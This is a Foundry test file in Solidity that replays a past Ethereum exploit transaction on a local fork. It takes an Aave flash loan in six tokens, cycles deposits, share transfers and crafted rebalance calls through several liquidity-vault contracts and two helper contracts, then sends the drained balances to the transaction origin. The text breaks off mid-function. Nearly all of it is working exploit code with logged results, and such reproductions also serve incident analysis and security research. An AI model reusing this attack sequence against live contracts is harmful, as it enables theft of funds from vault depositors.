// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc
// https://etherscan.io/address/0xf9E3D08196F76f5078882d98941b71C0884BEa52

interface I {
    function transfer(address, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function token0() external payable returns (address);
    function pool() external payable;
    function deposit(uint256, uint256) external payable;
    function slot0() external payable;
    function allowance(address, address) external payable returns (uint256);
    function approve(address, uint256) external payable;
    function tickUpper() external payable;
    function withdraw(uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, uint256[] memory, address, bytes memory, uint16)
        external
        payable;
    function tickLower() external payable;
    function position() external payable;
    function token1() external payable returns (address);
    function userInfo(address) external payable;
    function transferTokens(address, address, uint256) external payable;
}

contract Xdfb6 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc");
    }

    address constant x0a81 = 0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0;
    address constant x11b8 = 0x11b815efB8f581194ae79006d24E0d814B7697F6;
    address constant x1d42 = 0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801;
    address constant x1f98 = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant x2260 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant x4e68 = 0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36;
    address constant x576c = 0x576Cf5f8BA98E1643A2c93103881D8356C3550cF;
    address constant x6059 = 0x60594a405d53811d3BC4766596EFD80fd545A270;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x6f3f = 0x6f3F35a268B3af45331471EABF3F9881b601F5aA;
    address constant x7d27 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant x88e6 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address constant x8ad5 = 0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8;
    address constant x98d1 = 0x98d149e227C75D38F623A9aa9F030fB222B3FAa3;
    address constant x99ac = 0x99ac8cA7087fA4A2A1FB6357269965A2014ABc35;
    address constant x99c8 = 0x99C85bb64564D9eF9A99621301f22C9993Cb89E3;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xb53d = 0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc4ff = 0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48;
    address constant xcbcd = 0xCBCdF9626bC03E24f779434178A73a0B4bad62eD;
    address constant xd282 = 0xd282f740Bb0FF5d9e0A861dF024fcBd3c0bD0dc8;
    address constant xd63b = 0xd63b340F6e9CCcF0c997c83C8d036fa53B113546;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant xdd90 = 0xDD90112eAF865E4E0030000803ebBb4d84F14617;
    address constant xe22e = 0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35;

    function test() public {
        vm.createSelectFork("http://localhost:18545", 12955062); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc));

        // https://explorer.phalcon.xyz/tx/eth/0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc
        x6466c309();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 12955062); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1628031222);
        vm.roll(12955063);
        // https://explorer.phalcon.xyz/tx/eth/0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984),
            keccak256(abi.encode(RECEIVER, uint256(4))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x6B175474E89094C44Da98b954EedeAC495271d0F),
            keccak256(abi.encode(RECEIVER, uint256(2))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x6f3F35a268B3af45331471EABF3F9881b601F5aA),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x98d149e227C75D38F623A9aa9F030fB222B3FAa3),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xd63b340F6e9CCcF0c997c83C8d036fa53B113546),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xdAC17F958D2ee523a2206206994597C13D831ec7),
            keccak256(abi.encode(RECEIVER, uint256(2))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xDD90112eAF865E4E0030000803ebBb4d84F14617),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        x6466c309();
    }

    function x6466c309() public {
        address[] memory arr01 = new address[](6);
        arr01[0] = xdac1;
        arr01[1] = xc02a;
        arr01[2] = x2260;
        arr01[3] = xa0b8;
        arr01[4] = x6b17;
        arr01[5] = x1f98;
        uint256[] memory arr02 = new uint256[](6);
        arr02[0] = 30000000000000;
        arr02[1] = 13000000000000000000000;
        arr02[2] = 140000000000;
        arr02[3] = 30000000000000;
        arr02[4] = 3000000000000000000000000;
        arr02[5] = 200000000000000000000000;
        uint256[] memory arr03 = new uint256[](6);
        arr03[0] = 0;
        arr03[1] = 0;
        arr03[2] = 0;
        arr03[3] = 0;
        arr03[4] = 0;
        arr03[5] = 0;
        I(x7d27).flashLoan(r, arr01, arr02, arr03, r, "", 0);

        I(xc02a).withdraw(0);
        x99c8.call("");
        // uint256 v1 = 4977178993184;
        uint256 v1 = I(xdac1).balanceOf(r);
        console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(4977178993184));
        I(xdac1).transfer(tx.origin, v1);
        // uint256 v2 = 2560726090014232766731;
        uint256 v2 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "2560726090014232766731 (2560.7260 ether)");
        I(xc02a).transfer(tx.origin, v2);
        // uint256 v3 = 9616200167;
        uint256 v3 = I(x2260).balanceOf(r);
        console2.log("I(x2260).balanceOf(r)\t\t->", uint256(9616200167));
        I(x2260).transfer(tx.origin, v3);
        // uint256 v4 = 5387085448419;
        uint256 v4 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(5387085448419));
        I(xa0b8).transfer(tx.origin, v4);
        // uint256 v5 = 159928049788569637316002;
        uint256 v5 = I(x6b17).balanceOf(r);
        console2.log("I(x6b17).balanceOf(r)\t\t->", "159928049788569637316002 (159928.4978 ether)");
        I(x6b17).transfer(tx.origin, v5);
        // uint256 v6 = 10485060531001037336542;
        uint256 v6 = I(x1f98).balanceOf(r);
        console2.log("I(x1f98).balanceOf(r)\t\t->", "10485060531001037336542 (10485.6053 ether)");
        I(x1f98).transfer(tx.origin, v6);
    }

    function call() public {}

    function executeOperation(address[] memory, uint256[] memory, uint256[] memory, address, bytes memory) public {
        I(xc4ff).pool();
        I(xc4ff).tickLower();
        I(xc4ff).tickUpper();
        // address v1 = xc02a;
        address v1 = I(xc4ff).token0();
        console2.log("I(xc4ff).token0()\t->", v1);
        // address v2 = xdac1;
        address v2 = I(xc4ff).token1();
        console2.log("I(xc4ff).token1()\t->", v2);
        // uint256 v3 = 13000000000000000000000;
        uint256 v3 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "13000000000000000000000 (13000.0 ether)");
        // uint256 v4 = 30000000000000;
        uint256 v4 = I(xdac1).balanceOf(r);
        console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(30000000000000));
        // uint256 v5 = 0;
        uint256 v5 = I(xc02a).allowance(r, xc4ff);
        console2.log("I(xc02a).allowance(r, xc4ff)\t->", uint256(0));
        I(xc02a).approve(xc4ff, v3);
        // uint256 v6 = 0;
        uint256 v6 = I(xdac1).allowance(r, xc4ff);
        console2.log("I(xdac1).allowance(r, xc4ff)\t->", uint256(0));
        I(xdac1).approve(xc4ff, v4);
        I(xc4ff).deposit(v3, v4);
        // uint256 v7 = 10520294087322201216;
        uint256 v7 = I(xc4ff).balanceOf(r);
        console2.log("I(xc4ff).balanceOf(r)\t\t->", "10520294087322201216 (10.5202 ether)");
        I(xc4ff).transfer(x576c, v7);
        x576c.call(abi.encodeWithSelector(0x9c81744a, xc4ff, 0, 0));
        I(x576c).transferTokens(xc4ff, xd282, 0);
        xd282.call(abi.encodeWithSelector(0x9c81744a, xc4ff, 0, 0));
        I(xd282).transferTokens(xc4ff, r, 0);
        // uint256 v8 = 10520294087322201216;
        uint256 v8 = I(xc4ff).balanceOf(r);
        console2.log("I(xc4ff).balanceOf(r)\t\t->", "10520294087322201216 (10.5202 ether)");
        I(xc4ff).withdraw(v8);
        I(xc4ff).userInfo(x576c);
        I(xc4ff).position();
        I(x4e68).slot0();
        x576c.call(abi.encodeWithSelector(0x9c81744a, xc4ff, 957182808388617756829, 2153268895539));
        I(xc4ff).userInfo(xd282);
        I(xc4ff).position();
        I(x4e68).slot0();
        xd282.call(abi.encodeWithSelector(0x9c81744a, xc4ff, 957182808388617756829, 2153268895539));
        I(xc4ff).userInfo(xd282);
        // uint256 v9 = 10448444544057658569;
        uint256 v9 = I(xc02a).balanceOf(xc4ff);
        console2.log("I(xc02a).balanceOf(xc4ff)\t->", "10448444544057658569 (10.4484 ether)");
        {
            // uint256 v10 = 1361897484;
            uint256 v10 = I(xdac1).balanceOf(xc4ff);
            console2.log("I(xdac1).balanceOf(xc4ff)\t->", uint256(1361897484));
            xd282.call(abi.encodeWithSelector(0x9c81744a, xc4ff, 10448444544057658569, 1));
            I(xd63b).pool();
            I(xd63b).tickLower();
            I(xd63b).tickUpper();
            // address v11 = xa0b8;
            address v11 = I(xd63b).token0();
            console2.log("I(xd63b).token0()\t->", v11);
            // address v12 = xc02a;
            address v12 = I(xd63b).token1();
            console2.log("I(xd63b).token1()\t->", v12);
            // uint256 v13 = 30000000000000;
            uint256 v13 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(30000000000000));
            // uint256 v14 = 12999999999999999998811;
            uint256 v14 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999998811 (12999.9999 ether)");
            // uint256 v15 = 0;
            uint256 v15 = I(xa0b8).allowance(r, xd63b);
            console2.log("I(xa0b8).allowance(r, xd63b)\t->", uint256(0));
            I(xa0b8).approve(xd63b, v13);
            // uint256 v16 = 0;
            uint256 v16 = I(xc02a).allowance(r, xd63b);
            console2.log("I(xc02a).allowance(r, xd63b)\t->", uint256(0));
            I(xc02a).approve(xd63b, v14);
            I(xd63b).deposit(v13, v14);
            // uint256 v17 = 11049813493007762278;
            uint256 v17 = I(xd63b).balanceOf(r);
            console2.log("I(xd63b).balanceOf(r)\t\t->", "11049813493007762278 (11.4981 ether)");
            I(xd63b).transfer(x576c, v17);
            x576c.call(abi.encodeWithSelector(0x9c81744a, xd63b, 0, 0));
            I(x576c).transferTokens(xd63b, xd282, 0);
            xd282.call(abi.encodeWithSelector(0x9c81744a, xd63b, 0, 0));
            I(xd282).transferTokens(xd63b, r, 0);
            // uint256 v18 = 11049813493007762278;
            uint256 v18 = I(xd63b).balanceOf(r);
            console2.log("I(xd63b).balanceOf(r)\t\t->", "11049813493007762278 (11.4981 ether)");
            I(xd63b).withdraw(v18);
            I(xd63b).userInfo(x576c);
            I(xd63b).position();
            I(x8ad5).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, xd63b, 2213550007203, 1008459192521606860404));
            I(xd63b).userInfo(xd282);
            I(xd63b).position();
            I(x8ad5).slot0();
            I(x8ad5).slot0();
        }
        {
            xd282.call(abi.encodeWithSelector(0x9c81744a, xd63b, 1525170753448, 286555093243381779079));
            I(xd63b).userInfo(xd282);
            // uint256 v19 = 41877670555;
            uint256 v19 = I(xa0b8).balanceOf(xd63b);
            console2.log("I(xa0b8).balanceOf(xd63b)\t->", uint256(41877670555));
            // uint256 v20 = 358765264881887021;
            uint256 v20 = I(xc02a).balanceOf(xd63b);
            console2.log("I(xc02a).balanceOf(xd63b)\t->", "358765264881887021 (0.3587 ether)");
            xd282.call(abi.encodeWithSelector(0x9c81744a, xd63b, v19, v20));
            I(x0a81).pool();
            I(x0a81).tickLower();
            I(x0a81).tickUpper();
            // address v21 = x2260;
            address v21 = I(x0a81).token0();
            console2.log("I(x0a81).token0()\t->", v21);
            // address v22 = xc02a;
            address v22 = I(x0a81).token1();
            console2.log("I(x0a81).token1()\t->", v22);
            // uint256 v23 = 140000000000;
            uint256 v23 = I(x2260).balanceOf(r);
            console2.log("I(x2260).balanceOf(r)\t\t->", uint256(140000000000));
            // uint256 v24 = 12999999999999999997510;
            uint256 v24 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999997510 (12999.9999 ether)");
            // uint256 v25 = 0;
            uint256 v25 = I(x2260).allowance(r, x0a81);
            console2.log("I(x2260).allowance(r, x0a81)\t->", uint256(0));
            I(x2260).approve(x0a81, v23);
            // uint256 v26 = 0;
            uint256 v26 = I(xc02a).allowance(r, x0a81);
            console2.log("I(xc02a).allowance(r, x0a81)\t->", uint256(0));
            I(xc02a).approve(x0a81, v24);
            I(x0a81).deposit(v23, v24);
            // uint256 v27 = 1015927662999207940;
            uint256 v27 = I(x0a81).balanceOf(r);
            console2.log("I(x0a81).balanceOf(r)\t\t->", "1015927662999207940 (1.1592 ether)");
            I(x0a81).transfer(x576c, v27);
            x576c.call(abi.encodeWithSelector(0x9c81744a, x0a81, 0, 0));
            I(x576c).transferTokens(x0a81, xd282, 0);
            xd282.call(abi.encodeWithSelector(0x9c81744a, x0a81, 0, 0));
            I(xd282).transferTokens(x0a81, r, 0);
            // uint256 v28 = 1015927662999207940;
            uint256 v28 = I(x0a81).balanceOf(r);
            console2.log("I(x0a81).balanceOf(r)\t\t->", "1015927662999207940 (1.1592 ether)");
            I(x0a81).withdraw(v28);
            I(x0a81).userInfo(x576c);
            I(x0a81).position();
            I(xcbcd).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, x0a81, 4716406358, 702197155635536587866));
            I(x0a81).userInfo(xd282);
        }
        {
            I(x0a81).position();
            I(xcbcd).slot0();
            I(xcbcd).slot0();
            xd282.call(abi.encodeWithSelector(0x9c81744a, x0a81, 2393520263, 215492920534297942113));
            I(x0a81).userInfo(xd282);
            // uint256 v29 = 175537727;
            uint256 v29 = I(x2260).balanceOf(x0a81);
            console2.log("I(x2260).balanceOf(x0a81)\t->", uint256(175537727));
            // uint256 v30 = 27540258507959674;
            uint256 v30 = I(xc02a).balanceOf(x0a81);
            console2.log("I(xc02a).balanceOf(x0a81)\t->", "27540258507959674 (0.2754 ether)");
            xd282.call(abi.encodeWithSelector(0x9c81744a, x0a81, v29, v30));
            I(x98d1).pool();
            I(x98d1).tickLower();
            I(x98d1).tickUpper();
            // address v31 = xc02a;
            address v31 = I(x98d1).token0();
            console2.log("I(x98d1).token0()\t->", v31);
            // address v32 = xdac1;
            address v32 = I(x98d1).token1();
            console2.log("I(x98d1).token1()\t->", v32);
            // uint256 v33 = 12999999999999999979852;
            uint256 v33 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999979852 (12999.9999 ether)");
            // uint256 v34 = 29999999999999;
            uint256 v34 = I(xdac1).balanceOf(r);
            console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(29999999999999));
            // uint256 v35 = 0;
            uint256 v35 = I(xc02a).allowance(r, x98d1);
            console2.log("I(xc02a).allowance(r, x98d1)\t->", uint256(0));
            I(xc02a).approve(x98d1, v33);
            // uint256 v36 = 0;
            uint256 v36 = I(xdac1).allowance(r, x98d1);
            console2.log("I(xdac1).allowance(r, x98d1)\t->", uint256(0));
            I(xdac1).approve(x98d1, v34);
            I(x98d1).deposit(v33, v34);
            // uint256 v37 = 9694769504403033230;
            uint256 v37 = I(x98d1).balanceOf(r);
            console2.log("I(x98d1).balanceOf(r)\t\t->", "9694769504403033230 (9.6947 ether)");
            I(x98d1).transfer(x576c, v37);
            x576c.call(abi.encodeWithSelector(0x9c81744a, x98d1, 0, 0));
            I(x576c).transferTokens(x98d1, r, 0);
            // uint256 v38 = 9694769504403033230;
            uint256 v38 = I(x98d1).balanceOf(r);
            console2.log("I(x98d1).balanceOf(r)\t\t->", "9694769504403033230 (9.6947 ether)");
            I(x98d1).withdraw(v38);
            I(x98d1).userInfo(x576c);
            I(x98d1).position();
            I(x11b8).slot0();
            I(x11b8).slot0();
        }
        {
            x576c.call(abi.encodeWithSelector(0x9c81744a, x98d1, 109231215844514100513, 697522908802));
            I(x98d1).userInfo(x576c);
            // uint256 v39 = 51456792029428364;
            uint256 v39 = I(xc02a).balanceOf(x98d1);
            console2.log("I(xc02a).balanceOf(x98d1)\t->", "51456792029428364 (0.5145 ether)");
            // uint256 v40 = 118293308;
            uint256 v40 = I(xdac1).balanceOf(x98d1);
            console2.log("I(xdac1).balanceOf(x98d1)\t->", uint256(118293308));
            x576c.call(abi.encodeWithSelector(0x9c81744a, x98d1, v39, v40));
            I(xb53d).pool();
            I(xb53d).tickLower();
            I(xb53d).tickUpper();
            // address v41 = x2260;
            address v41 = I(xb53d).token0();
            console2.log("I(xb53d).token0()\t->", v41);
            // address v42 = xa0b8;
            address v42 = I(xb53d).token1();
            console2.log("I(xb53d).token1()\t->", v42);
            // uint256 v43 = 139999999999;
            uint256 v43 = I(x2260).balanceOf(r);
            console2.log("I(x2260).balanceOf(r)\t\t->", uint256(139999999999));
            // uint256 v44 = 29999999999999;
            uint256 v44 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(29999999999999));
            // uint256 v45 = 0;
            uint256 v45 = I(x2260).allowance(r, xb53d);
            console2.log("I(x2260).allowance(r, xb53d)\t->", uint256(0));
            I(x2260).approve(xb53d, v43);
            // uint256 v46 = 0;
            uint256 v46 = I(xa0b8).allowance(r, xb53d);
            console2.log("I(xa0b8).allowance(r, xb53d)\t->", uint256(0));
            I(xa0b8).approve(xb53d, v44);
            I(xb53d).deposit(v43, v44);
            // uint256 v47 = 35864087448105;
            uint256 v47 = I(xb53d).balanceOf(r);
            console2.log("I(xb53d).balanceOf(r)\t\t->", uint256(35864087448105));
            I(xb53d).transfer(x576c, v47);
            x576c.call(abi.encodeWithSelector(0x9c81744a, xb53d, 0, 0));
            I(x576c).transferTokens(xb53d, r, 0);
            // uint256 v48 = 35864087448105;
            uint256 v48 = I(xb53d).balanceOf(r);
            console2.log("I(xb53d).balanceOf(r)\t\t->", uint256(35864087448105));
            I(xb53d).withdraw(v48);
            I(xb53d).userInfo(x576c);
            I(xb53d).position();
            I(x99ac).slot0();
            I(x99ac).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, xb53d, 2396079643, 921283832468));
            I(xb53d).userInfo(x576c);
            // uint256 v49 = 60656181;
            uint256 v49 = I(x2260).balanceOf(xb53d);
            console2.log("I(x2260).balanceOf(xb53d)\t->", uint256(60656181));
        }
        {
            // uint256 v50 = 350023335;
            uint256 v50 = I(xa0b8).balanceOf(xb53d);
            console2.log("I(xa0b8).balanceOf(xb53d)\t->", uint256(350023335));
            x576c.call(abi.encodeWithSelector(0x9c81744a, xb53d, 60656181, v50));
            I(x6f3f).pool();
            I(x6f3f).tickLower();
            I(x6f3f).tickUpper();
            // address v51 = xa0b8;
            address v51 = I(x6f3f).token0();
            console2.log("I(x6f3f).token0()\t->", v51);
            // address v52 = xc02a;
            address v52 = I(x6f3f).token1();
            console2.log("I(x6f3f).token1()\t->", v52);
            // uint256 v53 = 29999999999997;
            uint256 v53 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(29999999999997));
            // uint256 v54 = 12999999999999999978695;
            uint256 v54 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999978695 (12999.9999 ether)");
            // uint256 v55 = 0;
            uint256 v55 = I(xa0b8).allowance(r, x6f3f);
            console2.log("I(xa0b8).allowance(r, x6f3f)\t->", uint256(0));
            I(xa0b8).approve(x6f3f, v53);
            // uint256 v56 = 0;
            uint256 v56 = I(xc02a).allowance(r, x6f3f);
            console2.log("I(xc02a).allowance(r, x6f3f)\t->", uint256(0));
            I(xc02a).approve(x6f3f, v54);
            I(x6f3f).deposit(v53, v54);
            // uint256 v57 = 10265815882652038166;
            uint256 v57 = I(x6f3f).balanceOf(r);
            console2.log("I(x6f3f).balanceOf(r)\t\t->", "10265815882652038166 (10.2658 ether)");
            I(x6f3f).transfer(x576c, v57);
            x576c.call(abi.encodeWithSelector(0x9c81744a, x6f3f, 0, 0));
            I(x576c).transferTokens(x6f3f, r, 0);
            // uint256 v58 = 10265815882652038166;
            uint256 v58 = I(x6f3f).balanceOf(r);
            console2.log("I(x6f3f).balanceOf(r)\t\t->", "10265815882652038166 (10.2658 ether)");
            I(x6f3f).withdraw(v58);
            I(x6f3f).userInfo(x576c);
            I(x6f3f).position();
            I(x88e6).slot0();
            I(x88e6).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, x6f3f, 711067726156, 148393638750498448884));
            I(x6f3f).userInfo(x576c);
            // uint256 v59 = 785435307;
            uint256 v59 = I(xa0b8).balanceOf(x6f3f);
            console2.log("I(xa0b8).balanceOf(x6f3f)\t->", uint256(785435307));
            // uint256 v60 = 68499892231859261;
            uint256 v60 = I(xc02a).balanceOf(x6f3f);
            console2.log("I(xc02a).balanceOf(x6f3f)\t->", "68499892231859261 (0.6849 ether)");
            x576c.call(abi.encodeWithSelector(0x9c81744a, x6f3f, v59, v60));
            I(xdd90).pool();
        }
        {
            I(xdd90).tickLower();
            I(xdd90).tickUpper();
            // address v61 = x6b17;
            address v61 = I(xdd90).token0();
            console2.log("I(xdd90).token0()\t->", v61);
            // address v62 = xc02a;
            address v62 = I(xdd90).token1();
            console2.log("I(xdd90).token1()\t->", v62);
            // uint256 v63 = 3000000000000000000000000;
            uint256 v63 = I(x6b17).balanceOf(r);
            console2.log("I(x6b17).balanceOf(r)\t\t->", "3000000000000000000000000 (3000000.0 ether)");
            // uint256 v64 = 12999999999999999977525;
            uint256 v64 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999977525 (12999.9999 ether)");
            // uint256 v65 = 0;
            uint256 v65 = I(x6b17).allowance(r, xdd90);
            console2.log("I(x6b17).allowance(r, xdd90)\t->", uint256(0));
            I(x6b17).approve(xdd90, v63);
            // uint256 v66 = 0;
            uint256 v66 = I(xc02a).allowance(r, xdd90);
            console2.log("I(xc02a).allowance(r, xdd90)\t->", uint256(0));
            I(xc02a).approve(xdd90, v64);
            I(xdd90).deposit(v63, v64);
            // uint256 v67 = 1116745595199643040792804;
            uint256 v67 = I(xdd90).balanceOf(r);
            console2.log("I(xdd90).balanceOf(r)\t\t->", "1116745595199643040792804 (1116745.5951 ether)");
            I(xdd90).transfer(x576c, v67);
            x576c.call(abi.encodeWithSelector(0x9c81744a, xdd90, 0, 0));
            I(x576c).transferTokens(xdd90, xd282, 0);
            xd282.call(abi.encodeWithSelector(0x9c81744a, xdd90, 0, 0));
            I(xd282).transferTokens(xdd90, r, 0);
            // uint256 v68 = 1116745595199643040792804;
            uint256 v68 = I(xdd90).balanceOf(r);
            console2.log("I(xdd90).balanceOf(r)\t\t->", "1116745595199643040792804 (1116745.5951 ether)");
            I(xdd90).withdraw(v68);
            I(xdd90).userInfo(x576c);
            I(xdd90).position();
            I(x6059).slot0();
            I(x6059).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, xdd90, 162297271410468448411202, 41352142302073688768));
            I(xdd90).userInfo(xd282);
            I(xdd90).position();
            I(x6059).slot0();
            I(x6059).slot0();
            xd282.call(abi.encodeWithSelector(0x9c81744a, xdd90, 2842, 0));
            I(xdd90).userInfo(xd282);
        }
        {
            // uint256 v69 = 330778378101188904807;
            uint256 v69 = I(x6b17).balanceOf(xdd90);
            console2.log("I(x6b17).balanceOf(xdd90)\t->", "330778378101188904807 (330.7783 ether)");
            // uint256 v70 = 9622652369457259;
            uint256 v70 = I(xc02a).balanceOf(xdd90);
            console2.log("I(xc02a).balanceOf(xdd90)\t->", "9622652369457259 (0.9622 ether)");
            xd282.call(abi.encodeWithSelector(0x9c81744a, xdd90, v69, v70));
            I(xe22e).pool();
            I(xe22e).tickLower();
            I(xe22e).tickUpper();
            // address v71 = x1f98;
            address v71 = I(xe22e).token0();
            console2.log("I(xe22e).token0()\t->", v71);
            // address v72 = xc02a;
            address v72 = I(xe22e).token1();
            console2.log("I(xe22e).token1()\t->", v72);
            // uint256 v73 = 200000000000000000000000;
            uint256 v73 = I(x1f98).balanceOf(r);
            console2.log("I(x1f98).balanceOf(r)\t\t->", "200000000000000000000000 (200000.0 ether)");
            // uint256 v74 = 12999999999999999977524;
            uint256 v74 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "12999999999999999977524 (12999.9999 ether)");
            // uint256 v75 = 0;
            uint256 v75 = I(x1f98).allowance(r, xe22e);
            console2.log("I(x1f98).allowance(r, xe22e)\t->", uint256(0));
            I(x1f98).approve(xe22e, v73);
            // uint256 v76 = 0;
            uint256 v76 = I(xc02a).allowance(r, xe22e);
            console2.log("I(xc02a).allowance(r, xe22e)\t->", uint256(0));
            I(xc02a).approve(xe22e, v74);
            I(xe22e).deposit(v73, v74);
            // uint256 v77 = 527768802124133762559714;
            uint256 v77 = I(xe22e).balanceOf(r);
            console2.log("I(xe22e).balanceOf(r)\t\t->", "527768802124133762559714 (527768.8021 ether)");
            I(xe22e).transfer(x576c, v77);
            x576c.call(abi.encodeWithSelector(0x9c81744a, xe22e, 0, 0));
            I(x576c).transferTokens(xe22e, xd282, 0);
            xd282.call(abi.encodeWithSelector(0x9c81744a, xe22e, 0, 0));
            I(xd282).transferTokens(xe22e, r, 0);
            // uint256 v78 = 527768802124133762559714;
            uint256 v78 = I(xe22e).balanceOf(r);
            console2.log("I(xe22e).balanceOf(r)\t\t->", "527768802124133762559714 (527768.8021 ether)");
            I(xe22e).withdraw(v78);
            I(xe22e).userInfo(x576c);
            I(xe22e).position();
            I(x1d42).slot0();
            x576c.call(abi.encodeWithSelector(0x9c81744a, xe22e, 9744638682077619112827, 83474444471943711984));
            I(xe22e).userInfo(xd282);
            I(xe22e).position();
            I(x1d42).slot0();
        }
        {
            I(x1d42).slot0();
            xd282.call(abi.encodeWithSelector(0x9c81744a, xe22e, 3854344867991284481188, 50946704893675403803));
            I(xe22e).userInfo(xd282);
            // uint256 v79 = 495502592207192163174;
            uint256 v79 = I(x1f98).balanceOf(xe22e);
            console2.log("I(x1f98).balanceOf(xe22e)\t->", "495502592207192163174 (495.5025 ether)");
            // uint256 v80 = 1287406519113223826;
            uint256 v80 = I(xc02a).balanceOf(xe22e);
            console2.log("I(xc02a).balanceOf(xe22e)\t->", "1287406519113223826 (1.2874 ether)");
            xd282.call(abi.encodeWithSelector(0x9c81744a, xe22e, v79, v80));
            I(x576c).transferTokens(xdac1, r, 0);
            I(xd282).transferTokens(xdac1, r, 0);
            // uint256 v81 = 0;
            uint256 v81 = I(xdac1).allowance(r, x7d27);
            console2.log("I(xdac1).allowance(r, x7d27)\t->", uint256(0));
            I(xdac1).approve(x7d27, 30027000000000);
            I(x576c).transferTokens(xc02a, r, 0);
            I(xd282).transferTokens(xc02a, r, 0);
            // uint256 v82 = 0;
            uint256 v82 = I(xc02a).allowance(r, x7d27);
            console2.log("I(xc02a).allowance(r, x7d27)\t->", uint256(0));
